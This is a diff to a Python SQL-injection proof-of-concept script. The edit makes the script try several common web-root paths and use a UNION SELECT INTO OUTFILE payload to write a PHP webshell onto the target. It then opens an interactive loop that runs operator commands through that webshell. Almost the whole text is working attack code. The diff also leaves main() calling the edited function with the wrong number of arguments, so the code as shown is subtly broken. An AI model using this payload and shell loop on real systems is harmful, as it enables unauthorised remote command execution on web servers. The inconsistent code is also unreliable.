@@ -47,25 +47,30 @@ def exploit(url, param, payload):
 
     return True
 
-def shell_mode(url, param, payload):
-    if exploit(url, param, payload):
-        print("[+] Webshell successfully uploaded. Entering shell mode...\n")
-        while True:
-            shell = input("$ ")
-            web_shell = f"{url}/cmd.php?cmd="
-            full_url = web_shell + shell
+def shell_mode(url, param):
+    print("[+] Attempting to upload shell to server...\n")
+    paths = ['/var/www/html/', '/var/www/', '/home/user/htdocs/', '/www/', '/public_html/', '/var/www/html/example.com/public_html/', '/usr/local/nginx/html/']
+    
+    for path in paths:
+        payload = f"' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile '{path}shell.php' #"
+        if exploit(url, param, payload):
+            print("[+] Webshell successfully uploaded. Entering shell mode...\n")
+            while True:
+                shell = input("$ ")
+                web_shell = f"{url}/shell.php?cmd="
+                full_url = web_shell + shell
 
-            try:
-                response = requests.get(full_url)
-                print(response.text)
-                continue
+                try:
+                    response = requests.get(full_url)
+                    print(response.text)
+                    continue
 
-            except requests.RequestException as e:
-                print(f"[-] Error: {e}\n")
-                break
+                except requests.RequestException as e:
+                    print(f"[-] Error: {e}\n")
+                    break
 
-    else:
-        print("[-] Webshell not uploaded. Check output.txt for analysis...")
+        else:
+            print("[-] Webshell not uploaded. Check output.txt for analysis...")
 
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection PoC")
@@ -86,10 +91,7 @@ def main():
     for payload in payloads:
         exploit(url, args.param, payload)
 
-    print("[+] Attempting to upload shell to server...\n")
-    payload = "' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile './cmd.php' #"
     shell_mode(url, args.param, payload)
 
 if __name__ == "__main__":
     main()
-
